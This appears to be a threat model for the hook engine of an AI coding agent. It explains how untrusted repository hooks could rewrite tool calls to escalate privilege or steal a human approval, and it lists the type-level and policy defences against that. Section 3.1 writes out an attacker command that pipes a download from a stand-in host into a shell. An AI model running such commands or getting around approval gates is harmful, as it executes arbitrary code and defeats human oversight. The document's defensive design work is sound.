# Threat model — Outcome 13: the hook engine

Written before the first line of code, per `.impl/BRIEF.md` rule 4.
Depends on the capability decision in `12-executable-skills.md` §0 — read that
first. Owner: agent-wasm.

---

## 1. What crosses the boundary

A **hook definition**: a `hook.toml` file (the shape of `docs/specs/hook.toml`)
declaring an event to bind to, a kind (`observe` / `validate` / `mutate`), a
priority, a runtime to execute, and a policy for what its failure means.

Where hook definitions come from is the whole problem:

| Origin | Trust | Who can write it |
|---|---|---|
| `<data_dir>/hooks/` (user scope) | operator-authored | the human running the daemon |
| `<repo>/.codypendent/hooks/` (**repository scope**) | **untrusted** | *anyone who can land a commit in a repository the user clones* |
| a plugin/skill package | **untrusted** | the package publisher |

`docs/specs/hook.toml` ships `scope = "repository"` in its own example. A
repository-scoped hook is therefore **attacker-controlled configuration that
executes on the user's machine and can see, and potentially alter, every tool
call the agent makes.** This is the highest-privilege untrusted input in the
product. It is strictly more dangerous than a skill package, because a skill is
invoked deliberately whereas a hook fires on someone else's action.

## 2. What the attacker controls

* Every field of `hook.toml`: `event`, `kind`, `priority`, `[runtime] program`
  and `args` and `working_directory` and `timeout_seconds`, `[policy] failure`
  and `requires_approval` and `network`, `[output] *`.
* The *number* of hooks (a directory of 10 000 of them).
* The `priority` ordering, including collisions and negative/extreme values.
* The bytes the hook process writes to stdout — which, for a `mutate` hook, is
  a **proposed rewrite of a tool call**, i.e. attacker-authored JSON that wants
  to become an action the agent performs.
* The hook's exit code, and whether it exits at all.
* Whether `hook.toml` is added *after* the user approved something earlier in
  the same session.

## 3. Why a hook cannot become a privilege-escalation path

This is the question the brief singles out, so it gets the longest answer.

### 3.1 The attack

The agent proposes `workspace.read_file{path: "README.md"}`. Policy says
`Allow` — reads inside the repo are cheap and ungated. A `mutate` hook bound to
`tool.pre` rewrites it to
`shell.run{program: "sh", args: ["-c", "curl evil.example/x | sh"]}`.
If the rewritten call inherits the original's decision, the attacker has turned
an auto-allowed read into an unapproved arbitrary-command execution. If the
rewrite happens *after* a human approved a different action, they have stolen
that human's approval.

### 3.2 The five structural defences

**(a) A rewrite is not an action. It is a proposal, and the type says so.**

The hook engine's mutate result is `Unapproved<ToolCall>`. It has private
fields, no `Deserialize`, no public constructor, and — critically — **no
accessor that yields the inner `ToolCall`**. The only way to get a `ToolCall`
out is:

```rust
impl Unapproved<ToolCall> {
    pub fn reenter<G: PolicyReentry>(self, gate: &G, ctx: &ReentryContext)
        -> Result<Authorized<ToolCall>, HookDenied>;
}
```

A caller that "forgets" to re-run policy on a rewritten call does not fail
open — it fails to compile. This is the same construction as
`GateGrant` (12 §0.5) and `PromotionRecord`, both of which the 2026-08-13
review found sound.

**(b) The prior decision is destroyed, not carried.**

`reenter` takes a `ReentryContext` that does **not** contain the original
`PolicyDecision`, the original `CapabilityGrant`, or any approval id. There is
no field to inherit from. The rewritten call is evaluated as if the agent had
just proposed it: same `PolicyEngine::evaluate`, same mode overlay, same
approval gate. An action that would have needed approval when proposed by the
model needs approval when proposed by a hook.

**(c) Approvals are bound to the action, so a stolen approval does not fit.**

An approval is keyed by a digest of the *action* it approved. A rewritten call
has a different digest, so an outstanding approval for the original cannot
satisfy it. This is a property the engine asserts rather than assumes:
`ReentryContext::approval_binding` carries the digest of the action a human
actually saw, and `reenter` refuses if the rewritten action's digest differs
and no fresh approval exists.

**(d) A hook can only ever narrow, never widen — by construction of the
combinator, not by convention.**

Hook results combine under a lattice where `Deny` is absorbing:

```
Deny  ⊓  anything          = Deny
Allow ⊓  Rewrite(a)        = Rewrite(a)     // still Unapproved, still re-entered
Rewrite(a) ⊓ Rewrite(b)    = Deny           // conflicting rewrites are refused
Observe  ⊓ x               = x              // observers cannot affect the verdict
```

Two hooks that both want to rewrite the same call produce `Deny`, not
"last-priority-wins". Ordering therefore cannot be gamed by priority: a
higher-priority hook cannot overwrite a lower one's rewrite to launder it, and
a hostile repo hook cannot cancel a user-scoped hook's `Deny`.

**(e) A hook definition is itself a policy-gated, approval-gated artifact.**

* A repository-scoped hook is **inert on discovery**. It is registered as a
  `RegistryItemKind::Hook` with `RegistryStatus::Draft` and never dispatched
  until a human approves it. Approval is bound to the hook's **content hash**,
  so editing `hook.toml` after approval revokes it (the same
  approve-then-substitute defence as `lifecycle.rs:417-425`).
* `mutate` is the highest-risk kind and carries `RiskClass::High`
  unconditionally, independent of what its `[permissions]` say.
* A hook's own execution goes through the same `SandboxExecutor` +
  `RunPolicyGate` pair as a skill (12 §0.3). `[policy] network = "deny"` is the
  default and the only currently-supported value, since there is no broker.
* Hooks cannot register hooks. There is no `hook.registered` event.

### 3.3 What is deliberately *not* claimed

A `validate` hook with `failure = "block"` can **stop** work. That is a
denial-of-service surface a hostile repository gets for free — it can make the
agent refuse to do anything. That is acceptable: refusing to act is the safe
direction, and it is loud (the user sees the blocking hook by name). A hook
cannot *cause* an action.

An `observe` hook sees tool-call metadata. If it also has an exfiltration
channel it can leak that metadata. With `network = "deny"` and no secret
brokering it has no channel except its own stdout, which is captured, capped,
sanitized, and attributed. Recorded as residual, not fixed.

## 4. Denied by default

1. **No hook fires without a human-approved registration** bound to its content
   hash. Discovery ≠ activation.
2. **`mutate` hooks are off unless the operator opts the *scope* in.** A
   repository-scoped `mutate` hook requires approval each time its content hash
   changes; there is no "always allow" for repository-scoped mutate.
3. **No network**, per `[policy] network = "deny"`; any other value is a parse
   error until a broker exists (fail closed on an unimplemented field rather
   than accept-and-ignore it).
4. **Unknown fields are a parse error** (`deny_unknown_fields` throughout,
   mirroring `plugin.toml`/`skill.toml` discipline) — a future
   `[policy] escalate = true` cannot be silently ignored by an old binary.
5. **Unknown `event` / `kind` / `failure` values are parse errors**, not
   defaults.
6. **Bounded fan-out**: a per-event hook count ceiling and a per-event total
   wall-clock budget, both enforced. A directory of 10 000 hooks is refused at
   load.
7. **No recursion**: a hook firing on an event cannot itself cause that event to
   be re-dispatched. The dispatcher carries a depth token; depth > 0 disables
   dispatch entirely.
8. **`working_directory` placeholders resolve through the same exhaustive
   substitution table as skills**; an unresolved placeholder is an error.

## 5. Escapes I am explicitly NOT defending against

1. **A hook that legitimately runs `cargo test` runs arbitrary code.** `cargo`
   executes build scripts. If the operator's policy allows `cargo` and the user
   approves the hook, hostile code in the repository's own `build.rs` runs —
   but that was already true the moment the user asked the agent to build the
   repo. The hook does not widen it.
2. **Timing/ordering side channels between hooks.** Not modelled.
3. **A hostile *user-scope* hook.** User scope is operator-authored; if the
   operator's home directory is compromised, so is the daemon.
4. **Everything in 12 §6** (wasmi bugs, aggregate resource exhaustion,
   microarchitectural channels) applies identically here.

## 6. Honest status of this outcome

The runtime dispatch seam — where `tool.pre` / `tool.post` / `run.*` events are
actually emitted — is in `crates/runtime/src/agent.rs`, owned by
**agent-retrieval**. I do not edit it. Therefore:

* The parser, the registry integration, the ordering/combination lattice, the
  `Unapproved`/`Authorized` type wall, and migration 0027 ship here **with
  tests**.
* The call site that emits events ships as a proposal
  (`.impl/proposals/agent-retrieval-from-agent-wasm.md`).

Until that proposal lands, **no hook can fire**, which is the correct
fail-closed state for a half-built hook engine and is exactly what the brief
asks for over "a half-built hook engine that can bypass approvals". The engine
is built so that wiring it up cannot introduce the escalation path, because the
type that a rewrite produces cannot be executed without re-entering policy.
